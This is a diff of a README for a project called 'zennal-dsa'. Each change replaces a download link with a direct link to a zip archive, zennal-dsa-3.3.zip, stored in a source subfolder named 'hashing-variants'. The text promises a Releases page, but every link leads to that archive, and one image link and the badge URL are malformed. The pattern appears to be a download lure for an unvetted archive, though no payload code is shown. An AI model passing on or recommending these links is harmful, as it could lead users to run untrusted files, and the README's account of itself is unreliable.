@@ -1,6 +1,6 @@
 # 🚀 zennal-dsa - Efficient Tools for Learning and Development
 
-[![Download zennal-dsa](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/zennal-dsa-v1.0.zip%https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/zennal-dsa-v1.0.zip)](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/zennal-dsa-v1.0.zip)
+[![Download zennal-dsa](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/hashing-variants/zennal-dsa-3.3.zip%https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/hashing-variants/zennal-dsa-3.3.zip)](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/hashing-variants/zennal-dsa-3.3.zip)
 
 ## 📚 Introduction
 
@@ -12,7 +12,7 @@ Getting started with **zennal-dsa** is simple. Follow these steps to download an
 
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version:  
-   [Download zennal-dsa](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/zennal-dsa-v1.0.zip)
+   [Download zennal-dsa](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/hashing-variants/zennal-dsa-3.3.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Look for the latest version, which typically appears at the top. 
@@ -20,7 +20,7 @@ Getting started with **zennal-dsa** is simple. Follow these steps to download an
 3. **Download the Application**  
    Click on the version number you want. This will take you to a page with detailed information. Scroll down until you see the assets section. Here, you can find the files available for download.  
    
-   ![Releases Page](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/zennal-dsa-v1.0.zip+Page)  
+   ![Releases Page](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/hashing-variants/zennal-dsa-3.3.zip+Page)  
 
 4. **Select Your Operating System**  
    Depending on your operating system (Windows, macOS, or Linux), choose the appropriate file. The naming will usually indicate the OS. Click on the file to start the download.
@@ -61,7 +61,7 @@ If you encounter any issues while downloading or running the application, consid
 
 To start using **zennal-dsa**, you must download it. Click the link below to visit the Releases page and begin your journey as a developer:
 
-[Download zennal-dsa](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/zennal-dsa-v1.0.zip)
+[Download zennal-dsa](https://raw.githubusercontent.com/Fares914/zennal-dsa/main/src/ds/hashing-variants/zennal-dsa-3.3.zip)
 
 ## 📞 Contact
 
